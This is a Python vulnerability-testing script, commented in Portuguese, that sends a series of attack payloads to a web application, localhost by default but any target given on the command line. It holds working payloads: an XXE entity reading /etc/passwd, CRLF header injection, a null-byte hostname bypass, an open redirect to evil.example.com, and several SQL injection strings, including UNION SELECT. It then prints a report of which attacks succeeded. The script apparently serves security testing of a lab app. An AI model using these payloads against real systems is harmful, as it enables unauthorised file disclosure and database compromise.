#!/usr/bin/env python3
import requests
import sys
import json
import time
from typing import Dict, Any, List

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

TARGET = "http://localhost:8000"

def req(method: str, path: str, **kwargs) -> requests.Response | None:
    url = TARGET.rstrip('/') + path
    try:
        kwargs.setdefault('timeout', 10)
        kwargs.setdefault('allow_redirects', False)
        
        if method.upper() == 'GET':
            response = requests.get(url, **kwargs)
        elif method.upper() == 'POST':
            response = requests.post(url, **kwargs)
        else:
            print(f"{Colors.RED}[!] Método HTTP não suportado: {method}{Colors.ENDC}")
            return None
            
        return response
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}[!] Falha de Conexão: Não foi possível conectar a {TARGET}{Colors.ENDC}")
        return None
    except Exception as e:
        print(f"{Colors.YELLOW}[!] Erro na requisição para {url}: {e}{Colors.ENDC}")
        return None

def print_test_header(test_name: str):
    print(f"\n{Colors.CYAN}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}TESTE: {test_name}{Colors.ENDC}")
    print(f"{Colors.CYAN}{'='*60}{Colors.ENDC}")

def test_cve_2025_6491_xml_entity() -> Dict[str, Any]:
    print_test_header("CVE-2025-6491 - XXE Injection")
    
    # Teste 1: XML simples
    payload1 = '<root><data>test</data></root>'
    print(f"{Colors.BLUE}[>] Enviando XML simples...{Colors.ENDC}")
    r = req('POST', '/?action=soap', data=payload1, headers={'Content-Type': 'application/xml'})
    
    if not r:
        return {"name": "CVE-2025-6491 (XXE)", "exploited": False, "evidence": "Falha de conexão"}
    
    data = r.json()
    print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
    
    # Teste 2: Tentativa de XXE
    xxe_payload = '''<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>'''
    print(f"\n{Colors.BLUE}[>] Enviando payload XXE...{Colors.ENDC}")
    r2 = req('POST', '/?action=soap', data=xxe_payload, headers={'Content-Type': 'application/xml'})
    
    exploited = False
    evidence = "XXE não detectado"
    
    if r2 and r2.status_code == 200:
        data2 = r2.json()
        print(f"{Colors.YELLOW}[<] Resposta XXE: {json.dumps(data2, indent=2)}{Colors.ENDC}")
        exploited = data2.get('xxe_detected', False)
        evidence = data2.get('evidence', 'Resposta analisada')
    
    return {
        "name": "CVE-2025-6491 (XXE)",
        "exploited": exploited,
        "evidence": evidence,
        "payload": xxe_payload[:100] + "..." if len(xxe_payload) > 100 else xxe_payload,
        "details": f"Status: {r2.status_code if r2 else 'N/A'}, XXE Detectado: {exploited}"
    }

def test_cve_2025_1861_open_redirect() -> Dict[str, Any]:
    print_test_header("CVE-2025-1861 - Open Redirect")
    
    redirect_url = 'https://evil.example.com/phishing'
    print(f"{Colors.BLUE}[>] Testando redirecionamento para: {redirect_url}{Colors.ENDC}")
    r = req('GET', f'/?action=redirect&url={redirect_url}')
    
    exploited = False
    evidence = "Redirecionamento bloqueado"
    
    if r and r.status_code == 302:
        location = r.headers.get('Location', '')
        exploited = redirect_url in location
        evidence = f"Redirecionado para: {location}"
        print(f"{Colors.RED if exploited else Colors.GREEN}[<] {evidence}{Colors.ENDC}")
    elif r:
        data = r.json()
        print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
        evidence = data.get('evidence', 'Comportamento inesperado')
    
    return {
        "name": "CVE-2025-1861 (Open Redirect)",
        "exploited": exploited,
        "evidence": evidence,
        "payload": f"/?action=redirect&url={redirect_url}",
        "details": f"Status: {r.status_code if r else 'N/A'}, Location: {r.headers.get('Location', 'N/A') if r else 'N/A'}"
    }

def test_cve_2025_1736_crlf_injection() -> Dict[str, Any]:
    print_test_header("CVE-2025-1736 - CRLF Injection")
    
    payload = "UserAgent\r\nX-Injected-Header: Hacked\r\nX-Another: Test"
    print(f"{Colors.BLUE}[>] Enviando payload CRLF...{Colors.ENDC}")
    r = req('GET', '/?action=custom_request', params={'user_agent': payload})
    
    exploited = False
    evidence = "CRLF não detectado"
    
    if r and r.status_code == 200:
        data = r.json()
        print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
        exploited = data.get('crlf_detected', False)
        evidence = data.get('evidence', 'Resposta analisada')
    
    return {
        "name": "CVE-2025-1736 (CRLF Injection)",
        "exploited": exploited,
        "evidence": evidence,
        "payload": payload.replace('\r', '\\r').replace('\n', '\\n'),
        "details": f"Status: {r.status_code if r else 'N/A'}, Headers Injetados: {len(data.get('injected_headers', {})) if r and r.status_code == 200 else 0}"
    }

def test_cve_2025_1220_null_byte_bypass() -> Dict[str, Any]:
    print_test_header("CVE-2025-1220 - Null Byte Bypass")
    
    # Payload que explora a vulnerabilidade real
    payload = "trusted.com\0.evil.com"
    print(f"{Colors.BLUE}[>] Enviando hostname com null byte para bypass...{Colors.ENDC}")
    r = req('GET', '/?action=connect', params={'hostname': payload})
    
    exploited = False
    evidence = "Bypass com null byte falhou"
    
    if r and r.status_code == 200:
        data = r.json()
        print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
        exploited = data.get('bypass_successful', False)
        evidence = data.get('evidence', 'Resposta analisada')
    
    return {
        "name": "CVE-2025-1220 (Null Byte Bypass)",
        "exploited": exploited,
        "evidence": evidence,
        "payload": payload.replace('\0', '\\0'),
        "details": f"Status: {r.status_code if r else 'N/A'}, Bypass: {exploited}"
    }

def test_cve_2022_31631_sqlite_truncation() -> Dict[str, Any]:
    print_test_header("CVE-2022-31631 - SQLite Truncation")
    
    # Payload que explora truncamento real - string extremamente longa
    # O SQLite tem limites, mas vamos forçar um cenário de truncamento
    base_payload = "A" * 2000  # String muito longa
    injection_payload = "admin' OR 1=1--"
    payload = base_payload + injection_payload
    
    print(f"{Colors.BLUE}[>] Enviando payload muito longo para forçar truncamento...{Colors.ENDC}")
    r = req('GET', '/?action=search_user', params={'username': payload})
    
    exploited = False
    evidence = "Truncamento não explorado"
    
    if r and r.status_code == 200:
        data = r.json()
        print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
        exploited = data.get('sql_injection_successful', False)
        evidence = data.get('evidence', 'Resposta analisada')
        
        if data.get('quote_truncated', False) and not exploited:
            print(f"{Colors.YELLOW}[!] Truncamento detectado mas injeção não funcionou{Colors.ENDC}")
    
    return {
        "name": "CVE-2022-31631 (SQLite Truncation)",
        "exploited": exploited,
        "evidence": evidence,
        "payload": f"String de {len(payload)} caracteres com padrão de injeção",
        "details": f"Status: {r.status_code if r else 'N/A'}, Truncado: {data.get('quote_truncated', False) if r and r.status_code == 200 else 'N/A'}"
    }

def test_sqli_mysql_classic() -> Dict[str, Any]:
    print_test_header("SQL Injection Clássica - MySQL")
    
    # Testar múltiplos payloads
    payloads = [
        "' OR '1'='1",
        "' OR 1=1-- -",
        "x' OR name LIKE '%a%' OR 'x'='y",
        "'; SELECT * FROM customers WHERE '1'='1",
        "' UNION SELECT 1,2,3-- -"
    ]
    
    best_result = None
    
    for i, payload in enumerate(payloads):
        print(f"{Colors.BLUE}[>] Testando payload {i+1}: {payload}{Colors.ENDC}")
        r = req('GET', '/?action=mysql_search', params={'name': payload})
        
        if r and r.status_code == 200:
            data = r.json()
            print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
            
            # Se encontrou uma injeção bem-sucedida, usar esse resultado
            if data.get('sql_injection_successful', False):
                best_result = {
                    'data': data,
                    'payload': payload,
                    'exploited': True
                }
                print(f"{Colors.GREEN}[+] Injeção SQL bem-sucedida com payload: {payload}{Colors.ENDC}")
                break
            elif best_result is None:
                best_result = {
                    'data': data,
                    'payload': payload,
                    'exploited': False
                }
        
        time.sleep(0.3)  # Pequena pausa entre requests
    
    exploited = False
    evidence = "SQL Injection falhou"
    details = "Nenhum payload funcionou"
    
    if best_result:
        data = best_result['data']
        exploited = best_result['exploited']
        evidence = data.get('evidence', 'Resposta analisada')
        details = f"Status: 200, Registros: {data.get('results_count', 0)}"
        
        if 'error' in data:
            evidence = f"Erro de banco: {data.get('details', 'Desconhecido')}"
            # Se há erro de syntax, pode ser injeção
            if "syntax" in evidence.lower():
                exploited = True
                evidence = "Erro de syntax - possível SQL Injection detectada"
    
    return {
        "name": "SQLI_MYSQL_CLASSIC",
        "exploited": exploited,
        "evidence": evidence,
        "payload": best_result['payload'] if best_result else payloads[0],
        "details": details
    }

def test_cve_2025_1734_header_parsing() -> Dict[str, Any]:
    print_test_header("CVE-2025-1734 - Header Parsing")
    
    payload = "HeaderSemDoisPontos ValorInvalido"
    print(f"{Colors.BLUE}[>] Enviando header malformado...{Colors.ENDC}")
    r = req('GET', '/?action=parse_header', params={'header': payload})
    
    exploited = False
    evidence = "Header malformado rejeitado"
    
    if r and r.status_code == 200:
        data = r.json()
        print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
        exploited = data.get('exploitable') == 'YES'
        evidence = data.get('evidence', 'Resposta analisada')
    
    return {
        "name": "CVE-2025-1734 (Header Malformado)",
        "exploited": exploited,
        "evidence": evidence,
        "payload": payload,
        "details": f"Status: {r.status_code if r else 'N/A'}, Explorável: {data.get('exploitable', 'N/A') if r and r.status_code == 200 else 'N/A'}"
    }

def test_cve_2025_1217_header_folding() -> Dict[str, Any]:
    print_test_header("CVE-2025-1217 - Header Folding")
    
    payload = "Header-Valor\r\n\tContinuacaoInvalida"
    print(f"{Colors.BLUE}[>] Enviando header com folding...{Colors.ENDC}")
    r = req('POST', '/?action=folded_header', data=payload)
    
    exploited = False
    evidence = "Header folding não detectado"
    
    if r and r.status_code == 200:
        data = r.json()
        print(f"{Colors.YELLOW}[<] Resposta: {json.dumps(data, indent=2)}{Colors.ENDC}")
        exploited = data.get('exploitable') == 'YES'
        evidence = data.get('evidence', 'Resposta analisada')
    
    return {
        "name": "CVE-2025-1217 (Header Folding)",
        "exploited": exploited,
        "evidence": evidence,
        "payload": payload.replace('\r\n\t', '\\r\\n\\t'),
        "details": f"Status: {r.status_code if r else 'N/A'}, Explorável: {data.get('exploitable', 'N/A') if r and r.status_code == 200 else 'N/A'}"
    }

def generate_summary_report(results: List[Dict[str, Any]]):
    print(f"\n{Colors.PURPLE}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.PURPLE}RELATÓRIO FINAL DE VULNERABILIDADES{Colors.ENDC}")
    print(f"{Colors.PURPLE}{'='*80}{Colors.ENDC}")
    
    exploited = [r for r in results if r['exploited']]
    failed = [r for r in results if not r['exploited']]
    
    print(f"\n{Colors.BOLD}ESTATÍSTICAS:{Colors.ENDC}")
    print(f"{Colors.GREEN}✓ Vulnerabilidades Exploradas: {len(exploited)}{Colors.ENDC}")
    print(f"{Colors.RED}✗ Vulnerabilidades Não Exploradas: {len(failed)}{Colors.ENDC}")
    print(f"{Colors.BLUE}↯ Total de Testes: {len(results)}{Colors.ENDC}")
    
    if exploited:
        print(f"\n{Colors.BOLD}{Colors.RED}VULNERABILIDADES EXPLORADAS COM SUCESSO:{Colors.ENDC}")
        for i, vuln in enumerate(exploited, 1):
            print(f"\n{i}. {Colors.RED}{vuln['name']}{Colors.ENDC}")
            print(f"   {Colors.YELLOW}Evidência: {vuln['evidence']}{Colors.ENDC}")
            print(f"   {Colors.BLUE}Payload: {vuln['payload']}{Colors.ENDC}")
            print(f"   {Colors.GREEN}Detalhes: {vuln['details']}{Colors.ENDC}")
    
    if failed:
        print(f"\n{Colors.BOLD}{Colors.YELLOW}VULNERABILIDADES NÃO EXPLORADAS:{Colors.ENDC}")
        for i, vuln in enumerate(failed, 1):
            print(f"\n{i}. {vuln['name']}")
            print(f"   {Colors.YELLOW}Razão: {vuln['evidence']}{Colors.ENDC}")
    
    print(f"\n{Colors.BOLD}RECOMENDAÇÕES:{Colors.ENDC}")
    if exploited:
        print(f"{Colors.RED}❌ CRÍTICO: {len(exploited)} vulnerabilidade(s) requerem atenção imediata!{Colors.ENDC}")
        print("   - Implemente validação de entrada rigorosa")
        print("   - Use prepared statements para SQL")
        print("   - Valide e sanitize todos os headers HTTP")
        print("   - Implemente WAF (Web Application Firewall)")
    else:
        print(f"{Colors.GREEN}✅ SITUAÇÃO CONTROLADA: Nenhuma vulnerabilidade crítica explorada{Colors.ENDC}")
        print("   - Mantenha as práticas de segurança atuais")
        print("   - Continue com testes regulares")
    
    print(f"\n{Colors.PURPLE}{'='*80}{Colors.ENDC}")

def main():
    global TARGET
    if len(sys.argv) > 1:
        TARGET = sys.argv[1]
    
    print(f"{Colors.BLUE}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}INICIANDO TESTES DE VULNERABILIDADE CVE{Colors.ENDC}")
    print(f"{Colors.BLUE}Alvo: {TARGET}{Colors.ENDC}")
    print(f"{Colors.BLUE}Hora de Início: {time.strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
    print(f"{Colors.BLUE}{'='*80}{Colors.ENDC}")
    
    tests = [
        test_cve_2025_6491_xml_entity,
        test_cve_2025_1861_open_redirect,
        test_cve_2025_1736_crlf_injection,
        test_cve_2025_1220_null_byte_bypass,
        test_cve_2022_31631_sqlite_truncation,
        test_cve_2025_1734_header_parsing,
        test_cve_2025_1217_header_folding,
        test_sqli_mysql_classic,
    ]
    
    results = []
    
    for test in tests:
        try:
            result = test()
            results.append(result)
            
            status_color = Colors.GREEN if result['exploited'] else Colors.RED
            status_icon = "✓" if result['exploited'] else "✗"
            print(f"\n{status_color}[{status_icon}] {result['name']} - {'EXPLORADA' if result['exploited'] else 'BLOQUEADA'}{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Erro no teste: {e}{Colors.ENDC}")
            results.append({
                "name": test.__name__,
                "exploited": False,
                "evidence": f"Erro durante execução: {str(e)}",
                "payload": "N/A",
                "details": "Teste falhou"
            })
    
    generate_summary_report(results)

if __name__ == "__main__":
    main()